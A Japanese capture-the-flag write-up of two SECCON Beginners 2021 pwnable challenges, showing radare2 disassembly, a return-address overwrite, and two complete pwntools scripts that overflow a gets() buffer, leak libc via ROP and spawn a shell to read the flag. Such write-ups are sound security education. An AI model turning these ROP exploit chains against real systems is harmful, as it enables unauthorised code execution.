# SECCON Beginners 2021 Pwnable

## rewriter

radare2のaflでバイナリの関数一覧を見ると，**sym.win**という関数が見つかる。

さらにpdfで中身を見ていくと，
```
0x00401233      e8a8feffff     call sym.imp.execve
```
というシェルを実行する行が見つかるので，
RETの値をsym.winのアドレス **0x00000000004011f6** に書き換える。

```
Where would you like to rewrite it?
> 0x00007ffeacc3f728
0x00007ffeacc3f728 = 0x004011f6

[Addr]              |[Value]
====================+===================
 0x00007ffeacc3f6f0 | 0x3131303430307830  <- buf
 0x00007ffeacc3f6f8 | 0x37663363000a3666
 0x00007ffeacc3f700 | 0x00000000000a3832
 0x00007ffeacc3f708 | 0x0000000000000000
 0x00007ffeacc3f710 | 0x00000000004011f6  <- target
 0x00007ffeacc3f718 | 0x00007ffeacc3f728  <- value
 0x00007ffeacc3f720 | 0x0000000000401520  <- saved rbp
 0x00007ffeacc3f728 | 0x00000000004011f6  <- saved ret addr
 0x00007ffeacc3f730 | 0x0000000000000001
 0x00007ffeacc3f738 | 0x00007ffeacc3f808

ctf4b{th3_r3turn_4ddr355_15_1n_th3_5t4ck}
```

## beginners_rop
問題のタイトル，添付されたlibcファイルなどより，ROPやRET2Mainを活用する問題であると考える。(Malleus CTF Pwn の login3を参照)

```
nc beginners-rop.quals.beginners.seccon.jp 4102
kfljewklf
kfljewklf
```

入力した内容をおうむ返しするプログラムだとわかる。

続いてスタックを確認すると
```
> pdf@main

int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x100
│           0x00401196      f30f1efa       endbr64
│           0x0040119a      55             push rbp
│           0x0040119b      4889e5         mov rbp, rsp
│           0x0040119e      4881ec000100.  sub rsp, 0x100
│           0x004011a5      488d8500ffff.  lea rax, [s]
│           0x004011ac      4889c7         mov rdi, rax                ; char *s
│           0x004011af      e8dcfeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004011b4      488d8500ffff.  lea rax, [s]
│           0x004011bb      4889c7         mov rdi, rax                ; const char *s
│           0x004011be      e8adfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011c3      b800000000     mov eax, 0
│           0x004011c8      c9             leave
└           0x004011c9      c3             ret
[0x004010b0]> 
```
入力された文字用のスタックと古いRBPレジスタの値を入れるスタック，これらのサイズが合わせて0x108であることがわかる。

http://feneshi.co/ctf4b2021writeup/#beginners_rop
より，設問者の回答スクリプト
```
#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '4102'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
libc = ELF('./libc-2.27.so')
context.binary = binfile
io = remote(HOST, PORT)

# padding
pad = b'a' * 0x108

# one_gadgets
one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

# libc base address leak
rop = ROP(e)
rop.puts(e.got['__libc_start_main'])
rop.call(e.sym['main'])

payload = pad + rop.chain()

io.sendline(payload)

io.readline()

gets_addr = io.recvline()

libc_base = unpack(gets_addr.ljust(8, b'\0')) - libc.sym['__libc_start_main']

# call one_gadget

rop = ROP(e)
rop.call(pack(libc_base + one_gadgets[0]))

payload = pad + rop.chain()

io.sendline(payload)

io.sendline('echo "hello shell"')
io.recvuntil(b'hello shell\n')
io.sendline('cat flag.txt')
print(io.recvuntil(b'}').decode('utf-8', 'ignore'))
io.close()
exit()
```

自身のスクリプト
```
# nc beginners-rop.quals.beginners.seccon.jp 4102
from pwn import *

elf=ELF('chall')
context.binary = elf

s=remote('beginners-rop.quals.beginners.seccon.jp',4102)

rop=ROP(elf)
rop.puts(elf.got.puts)
rop.main()
print(rop.dump())
s.sendline(b'a'*0x108+rop.chain())

s.recvline()
puts=s.recvline()
puts=unpack(puts[:-1].ljust(8,b'\0'))
print('puts: %x'%puts)

libc=ELF('libc-2.27.so')
libc.address = puts-libc.symbols.puts

rop=ROP(libc)
rop.execv(next(libc.search(b'/bin/sh')), 0)
print(rop.dump())
s.sendline(b'a'*0x108 + rop.chain())

s.sendline('echo "hello shell"')
s.recvuntil(b'hello shell\n')
s.sendline('cat flag.txt')
print(s.recvuntil(b'}').decode('utf-8', 'ignore'))
s.close()
exit()
```

**ctf4b{H4rd_ROP_c4f3}**